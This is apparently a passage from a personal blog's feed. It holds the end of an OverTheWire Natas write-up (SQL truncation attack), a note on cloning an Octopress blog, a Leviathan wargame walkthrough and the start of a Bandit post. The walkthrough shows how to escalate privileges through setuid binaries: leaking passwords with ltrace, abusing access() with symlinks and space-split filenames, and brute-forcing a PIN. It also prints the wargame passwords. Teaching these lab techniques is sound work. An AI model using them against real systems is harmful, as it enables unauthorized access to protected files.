<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;natas28&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the result:</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/sqlfiddle.png" title="sqlfiddle" alt="sqlfiddle"></p>

<p>When trying to insert the long string next I received a data truncation error because it was larger than the allowed 64 characters, so I manually adjusted it to natas28 + 57 spaces:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>'natas28                                                         '</span></code></pre></td></tr></table></div></figure>


<p>Then I added it to the table:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">users</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">&#39;natas28                                                         &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>And when querying the database both are returned (with the first being the original natas28 user):</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/sqlfiddle2.png" title="sqlfiddle2" alt="sqlfiddle2"></p>

<p>To summarize:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># with input of 'natas28                                                                end'
</span><span class='line'>validUser() 
</span><span class='line'>  long string is truncated to natas28 end, which doesn't exist in the table
</span><span class='line'>createUser()
</span><span class='line'>  # input becomes 'natas28                                                         '
</span><span class='line'>  the value that is inserted in the table is truncated to the max length, in this case natas28 + 57 spaces
</span><span class='line'># now check again with username of natas28 and no password
</span><span class='line'>validUser() 
</span><span class='line'>  username already exists, so checkCredentials()
</span><span class='line'>  with the space trimming, the code returns both the original and my inserted username, as seen on sqlfiddle (but due to the PHP code, we only get the first row, which is fine, because that's the one we care about</span></code></pre></td></tr></table></div></figure>


<p>Password is <code>JWwR438wkgTsNKBbcJoowyysdM82YjeF</code></p>

<h3>Level 28</h3>

<p>And it&rsquo;s finished for now! Awesome challenge!</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/gz.png" title="gz" alt="gz"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ___________________________________
</span><span class='line'>&lt; You will triumph over your enemy. &gt;
</span><span class='line'> -----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Cloning Octopress blog]]></title>
    <link href="http://chousensha.github.io/blog/2015/11/26/cloning-octopress-blog/"/>
    <updated>2015-11-26T11:16:32-05:00</updated>
    <id>http://chousensha.github.io/blog/2015/11/26/cloning-octopress-blog</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve recently had some problems with Octopress breaking on my old Kali 1.0 box. And since the Kali 1.0 reached its end of life, figured this might be a good time to jump ship and install the 2.0 version, and set up a fresh Octopress there. So in this post I will quickly overview the steps needed to clone an already existing Octopress blog on a new machine and resume blogging from there.</p>

<!-- more -->


<h4>clone the source branch repository</h4>

<p>git clone -b source <a href="https://github.com/chousensha/chousensha.github.io.git">https://github.com/chousensha/chousensha.github.io.git</a> octopress</p>

<p>cd octopress</p>

<h4>clone master branch to _deploy</h4>

<p>git clone <a href="https://github.com/chousensha/chousensha.github.io.git">https://github.com/chousensha/chousensha.github.io.git</a> _deploy</p>

<p>The <code>source</code> branch contains the source of your blog, while the content that you generate is in the <code>master</code> branch.</p>

<p>Before proceeding with installing dependencies, I followed the instructions on <a href="http://octopress.org/docs/setup/">http://octopress.org/docs/setup/</a> to install rvm, Ruby 1.9.3 and ExecJs:</p>

<h4>install rvm</h4>

<p>command curl -sSL <a href="https://rvm.io/mpapis.asc">https://rvm.io/mpapis.asc</a> | gpg2 &mdash;import &ndash;
curl -L <a href="https://get.rvm.io">https://get.rvm.io</a> | bash -s stable &mdash;ruby</p>

<h4>run below to be able to use rvm in the shell windows, and add it to your shell rc file or you will need to always run it before using rvm</h4>

<p>source /usr/local/rvm/scripts/rvm</p>

<h4>install Ruby 1.9.3</h4>

<p>rvm install 1.9.3</p>

<p>You will get a message that this version of Ruby is no longer maintained, but I had problems with Ruby 2~ so keeping this for Octopress.</p>

<h4>use Ruby 1.9.3</h4>

<p>rvm use 1.9.3</p>

<h4>update the rubygems to the latest available</h4>

<p>rvm rubygems latest</p>

<h4>optional: check that your Ruby version is the right one</h4>

<p>ruby &mdash;version</p>

<h4>install JS runtime for Ruby</h4>

<p>gem install execjs</p>

<h4>now install dependencies</h4>

<p>gem install bundler
bundle install</p>

<h4>setup github pages</h4>

<p>bundle exec rake setup_github_pages</p>

<p>And you&rsquo;re good to go!</p>

<p>Note for <em>zsh</em> users: because of the globbing of <em>zsh</em>, you will need to add <code>alias rake=&ldquo;noglob rake&rdquo;</code> to your .zshrc file or you will get a no matches found error. Or you can quote the arguments given to rake: <code>rake &ldquo;new_post[Whatever]&rdquo;</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Few things are harder to put up with  \
</span><span class='line'>| than the annoyance of a good example. |
</span><span class='line'>|                                       |
</span><span class='line'>| -- "Mark Twain, Pudd'nhead Wilson's   |
</span><span class='line'>\ Calendar"                             /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OverTheWire: Leviathan]]></title>
    <link href="http://chousensha.github.io/blog/2015/07/30/overthewire-leviathan/"/>
    <updated>2015-07-30T10:01:22-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/07/30/overthewire-leviathan</id>
    <content type="html"><![CDATA[<p>The next step in difficulty for the OverTheWire wargames is Leviathan. From the description:</p>

<blockquote><p>This wargame doesn&rsquo;t require any knowledge about programming &ndash; just a bit of common sense and some knowledge about basic *nix commands.</p></blockquote>

<p>Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on <strong>leviathan.labs.overthewire.org</strong> through SSH.</p>

<p>To login to the first level use:</p>

<p>Username: leviathan0</p>

<p>Password: leviathan0</p>

<p>Data for the levels can be found in the homedirectories.</p>

<!-- more -->


<h3>Level 0 &ndash;> Level 1</h3>

<p>There is no information about what you have to do for each level to progress, so you just have to look around.</p>

<p>If you do a <em>ls -la</em> in the home directory, you will see an interesting hidden directory owned by leviathan1:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan0@melinda:~$ ls -la
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x   3 root       root       4096 Nov 14  2014 .
</span><span class='line'>drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
</span><span class='line'>drwxr-x---   2 leviathan1 leviathan0 4096 Jul 17 16:44 .backup
</span><span class='line'>-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
</span><span class='line'>-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
</span><span class='line'>-rw-r--r--   1 root       root        675 Apr  9  2014 .profile</span></code></pre></td></tr></table></div></figure>


<p>Inside there is a bookmarks.html file with lots of links, so I tried grepping for the word password and wasn&rsquo;t disappointed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan0@melinda:~/.backup$ cat bookmarks.html  | grep password
</span><span class='line'>&lt;DT&gt;&lt;A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"&gt;password to leviathan1&lt;/A&gt;</span></code></pre></td></tr></table></div></figure>


<h3>Level 1 &ndash;> Level 2</h3>

<p>There is a setuid binary in the home folder that asks for a password. Running <em>strings</em> on it didn&rsquo;t reveal much, except that it uses <em>strcmp</em>..so it compares the input it receives with something..</p>

<p>I solved this by running <em>ltrace</em> on the binary. <em>ltrace</em> is a library call tracer:</p>

<blockquote><p>ltrace  is  a  program  that simply runs the specified command until it
exits.  It intercepts and records the dynamic library calls  which  are
called  by  the  executed process and the signals which are received by
 that process.  It can also intercept and print the  system  calls  executed by the program.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan1@melinda:~$ ltrace ./check
</span><span class='line'>__libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 &lt;unfinished ...&gt;
</span><span class='line'>printf("password: ")                                                                        = 10
</span><span class='line'>getchar(0x8048680, 47, 0x804a000, 0x8048642password: abcd
</span><span class='line'>)                                                = 97
</span><span class='line'>getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                = 98
</span><span class='line'>getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                = 99
</span><span class='line'>strcmp("abc", "sex")                                                                        = -1
</span><span class='line'>puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
</span><span class='line'>)                                                        = 29
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>


<p>In the <em>ltrace</em> output you can actually see the password that your input is compared with. Give it to the program and you will get a shell as leviathan2:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan1@melinda:~$ ./check 
</span><span class='line'>password: sex
</span><span class='line'>$ whoami
</span><span class='line'>leviathan2</span></code></pre></td></tr></table></div></figure>


<p>As in the previous wargame, look in <em>/etc/</em> for the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /etc/leviathan_pass/leviathan2
</span><span class='line'>ougahZi8Ta</span></code></pre></td></tr></table></div></figure>


<h3>Level 2 &ndash;> Level 3</h3>

<p>In this level we have another setuid binary named printfile. If you try to read the password file for the next level you just get a message that you an&rsquo;t have that file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
</span><span class='line'>You cant have that file...</span></code></pre></td></tr></table></div></figure>


<p>Running <em>ltrace</em> again we see the <em>access</em> system call is being used:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3   
</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 &lt;unfinished ...&gt;
</span><span class='line'>access("/etc/leviathan_pass/leviathan3", 4)                                                 = -1
</span><span class='line'>puts("You cant have that file..."You cant have that file...
</span><span class='line'>)                                                          = 27
</span><span class='line'>+++ exited (status 1) +++</span></code></pre></td></tr></table></div></figure>


<p>This is good news, because <em>access</em> is vulnerable to race conditions, as can be seen from its man page:</p>

<blockquote><p>access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.</p>

<p>The check is done using the calling process&rsquo;s real UID and GID,  rather than the effective IDs as is done when actually attempting an operation
(e.g., open(2)) on the file.  This allows set-user-ID programs to  easily determine the invoking user&rsquo;s authority.</p>

<p>Warning: Using access() to check if a user is authorized to, for  example, open a file before actually doing so using open(2) creates a security
hole, because the user  might  exploit  the  short  time  interval between  checking and opening the file to manipulate it. For this reason, the   > use of this system call should be avoided.</p></blockquote>

<p>A more detailed description from <a href="https://www.owasp.org/index.php/File_Access_Race_Condition:_TOCTOU">OWASP</a>:</p>

<blockquote><p>The window of time between when a file property is checked and when the file is used can be exploited to launch a privilege escalation attack.</p>

<p>File access race conditions, known as time-of-check, time-of-use (TOCTOU) race conditions, occur when:</p>

<p>The program checks a property of a file, referencing the file by name.
The program later performs a filesystem operation using the same filename and assumes that the previously-checked property still holds.</p></blockquote>

<p>The first thing I thought was to create a file and make it a symlink to the password file, but it didn&rsquo;t work. So I just made a random file for test purposes and used <em>ltrace</em> again to see what is happening when accessing it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /tmp/baka/readme
</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd784, 0x8048600 &lt;unfinished ...&gt;
</span><span class='line'>access("/tmp/baka/readme", 4)                                                               = 0
</span><span class='line'>snprintf("/bin/cat /tmp/baka/readme", 511, "/bin/cat %s", "/tmp/baka/readme")               = 25
</span><span class='line'>system("/bin/cat /tmp/baka/readme"test
</span><span class='line'> &lt;no return ...&gt;
</span><span class='line'>--- SIGCHLD (Child exited) ---
</span><span class='line'>&lt;... system resumed&gt; )                                                                      = 0
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>


<p>I have to say, I used help for this one, because it wasn&rsquo;t clear to me on how to proceed (it&rsquo;s also where I got stuck when I first attempted this wargame). If <em>access</em> returns successfully, it will <em>cat</em> the file that was passed to it (and it&rsquo;s actually <em>snprintf</em> that does the <em>cat</em>. Remember from Bandit how <em>cat</em> won&rsquo;t print files with spaces in their names, unless the spaces are escaped or the filename is surrounded by quotes. I made a new dummy file with a space in its name:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:/tmp/baka$ cat space\ file 
</span><span class='line'>test
</span><span class='line'>leviathan2@melinda:/tmp/baka$ cat space file
</span><span class='line'>cat: space: No such file or directory
</span><span class='line'>cat: file: No such file or directory</span></code></pre></td></tr></table></div></figure>


<p>Now I ran <em>ltrace</em> again and tried to print this new file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /tmp/baka/space\ file 
</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd764, 0x8048600 &lt;unfinished ...&gt;
</span><span class='line'>access("/tmp/baka/space file", 4)                                                           = 0
</span><span class='line'>snprintf("/bin/cat /tmp/baka/space file", 511, "/bin/cat %s", "/tmp/baka/space file")       = 29
</span><span class='line'>system("/bin/cat /tmp/baka/space file"/bin/cat: /tmp/baka/space: No such file or directory
</span><span class='line'>/bin/cat: file: No such file or directory
</span><span class='line'> &lt;no return ...&gt;
</span><span class='line'>--- SIGCHLD (Child exited) ---
</span><span class='line'>&lt;... system resumed&gt; )                                                                      = 256
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>


<p>There is a discrepancy between <em>access</em>, which checks the path of the file, and what <em>cat</em> tries to print, two different files that don&rsquo;t exist, <em>space</em> and <em>file</em> (because the space isn&rsquo;t seen as part of the filename, but as a separator between arguments):</p>

<ul>
<li><p><em>cat</em> tries /tmp/baka/space</p></li>
<li><p><em>cat</em> tries file</p></li>
</ul>


<p>This is where the symbolic link exploitation part comes in place. It didn&rsquo;t work before, but if I now create a symlink to the password file and name it <em>space</em>, it will match the first half of the file that <em>cat</em> will try to print:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:/tmp/baka$ ls -l
</span><span class='line'>total 8
</span><span class='line'>-rw-rw-r-- 1 leviathan2 leviathan2  5 Jul 31 12:18 readme
</span><span class='line'>lrwxrwxrwx 1 leviathan2 leviathan2 30 Jul 31 15:45 space -&gt; /etc/leviathan_pass/leviathan3
</span><span class='line'>-rw-rw-r-- 1 leviathan2 leviathan2  5 Jul 31 15:01 space file</span></code></pre></td></tr></table></div></figure>


<p>And now I run <em>printfile</em> again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ./printfile /tmp/baka/'space file'
</span><span class='line'>Ahdiemoo1j
</span><span class='line'>/bin/cat: file: No such file or directory</span></code></pre></td></tr></table></div></figure>


<p>Yay! It worked! Because <em>cat</em> first tried to print <em>space</em>, it followed the symlink with the same name and printed the password!</p>

<h3>Level 3 &ndash;> Level 4</h3>

<p>And another setuid binary! Running <em>strings</em> on it revealed it&rsquo;s a program that gives you a shell if you enter the right password. Along with string names such as do_stuff, nothing and morenothing xD</p>

<p><em>ltrace</em> keeps helping a lot with these challenges:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan3@melinda:~$ ltrace ./level3 
</span><span class='line'>__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 &lt;unfinished ...&gt;
</span><span class='line'>strcmp("h0no33", "kakaka")                                                                  = -1
</span><span class='line'>printf("Enter the password&gt; ")                                                              = 20
</span><span class='line'>fgets(Enter the password&gt; huh
</span><span class='line'>"huh\n", 256, 0xf7fcac20)                                                             = 0xffffd58c
</span><span class='line'>strcmp("huh\n", "snlprintf\n")                                                              = -1
</span><span class='line'>puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
</span><span class='line'>)                                                                  = 19
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>


<p>The first <em>strcmp</em> doesn&rsquo;t seem to be used for anything, but the second one is interesting. It compares the given input with..snlprintf?! There is no such function in the C library, so I assumed it&rsquo;s just a string..and:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan3@melinda:~$ ./level3 
</span><span class='line'>Enter the password&gt; snlprintf
</span><span class='line'>[You've got shell]!
</span><span class='line'>$ whoami
</span><span class='line'>leviathan4
</span><span class='line'>$ cat /etc/leviathan_pass/leviathan4
</span><span class='line'>vuH0coox6m</span></code></pre></td></tr></table></div></figure>


<p>Awesome! On to the next level!</p>

<h3>Level 4 &ndash;> Level 5</h3>

<p>There is a hidden directory in the home folder:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan4@melinda:~$ ls -la
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x   3 root root       4096 Nov 14  2014 .
</span><span class='line'>drwxr-xr-x 167 root root       4096 Jul  9 16:27 ..
</span><span class='line'>-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
</span><span class='line'>-rw-r--r--   1 root root       3637 Apr  9  2014 .bashrc
</span><span class='line'>-rw-r--r--   1 root root        675 Apr  9  2014 .profile
</span><span class='line'>dr-xr-x---   2 root leviathan4 4096 Nov 14  2014 .trash</span></code></pre></td></tr></table></div></figure>


<p>Inside there&rsquo;s a program that gives some binary output when run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan4@melinda:~/.trash$ ./bin 
</span><span class='line'>01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 </span></code></pre></td></tr></table></div></figure>


<p>Convert it to Ascii for the password: <code>Tith4cokei</code></p>

<h3>Level 5 &ndash;> Level 6</h3>

<p>Another binary! If you run it, it says it can&rsquo;t find a file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan5@melinda:~$ ./leviathan5 
</span><span class='line'>Cannot find /tmp/file.log</span></code></pre></td></tr></table></div></figure>


<p>This is a setuid binary, so maybe we can trick it into reading the password file for the leviathan5 user. I made a symlink to the password file with the name of the missing file, and the binary followed it right to the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
</span><span class='line'>leviathan5@melinda:~$ ./leviathan5 
</span><span class='line'>UgaoFee4li</span></code></pre></td></tr></table></div></figure>


<h3>Level 6 &ndash;> Level 7</h3>

<p>And yet another binary! This one asks for a 4-digit code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan6@melinda:~$ ./leviathan6 
</span><span class='line'>usage: ./leviathan6 &lt;4 digit code&gt;</span></code></pre></td></tr></table></div></figure>


<p>Lookint at the strings, it seems this program will give us a shell if we can find the right code. I was going to use Python again but I found a quick and easy way to bruteforce the code with a very small Bash script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'>
</span><span class='line'><span class="k">for </span>i in <span class="o">{</span>0000..9999<span class="o">}</span>
</span><span class='line'><span class="k">do</span>
</span><span class='line'><span class="nb">echo</span> <span class="s1">&#39;Trying&#39;</span> <span class="nv">$i</span>
</span><span class='line'>~/leviathan6 <span class="nv">$i</span>
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<p>This script iterates over the range of possible codes and tries each of them as input for the leviathan6 binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>Trying 7122
</span><span class='line'>Wrong
</span><span class='line'>Trying 7123
</span><span class='line'>$ whoami
</span><span class='line'>leviathan7
</span><span class='line'>$ cat /etc/leviathan_pass/leviathan7
</span><span class='line'>ahy7MaeBo9</span></code></pre></td></tr></table></div></figure>


<h3>Level 7 &ndash;> Level 8</h3>

<p>This is the final level, as you can see from the congratulatory note:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan7@melinda:~$ ls
</span><span class='line'>CONGRATULATIONS
</span><span class='line'>leviathan7@melinda:~$ cat CONGRATULATIONS 
</span><span class='line'>Well Done, you seem to have used a *nix system before, now try something more serious.
</span><span class='line'>(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)</span></code></pre></td></tr></table></div></figure>


<p>Better skip over that last line&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Tomorrow will be cancelled due to lack \
</span><span class='line'>\ of interest.                           /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OverTheWire: Bandit]]></title>
    <link href="http://chousensha.github.io/blog/2015/06/22/overthewire-bandit/"/>
    <updated>2015-06-22T13:11:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/06/22/overthewire-bandit</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve completed this and some other wargames before starting a blog, but I thought I should revisit them and do a proper walkthrough, and that would also help me organize my notes beyond one-liners that I no longer know what they were for :D So, going to start with Bandit, which is the most basic and beginner friendly of the OverTheWire wargames. You can look at each level&rsquo;s page for a list of commands that you may need to solve it and some additional reading material that might help in better understanding what&rsquo;s going on. I will also give <em>man</em> pages descriptions for the commands I&rsquo;ll use to complete the levels.</p>

<!-- more -->


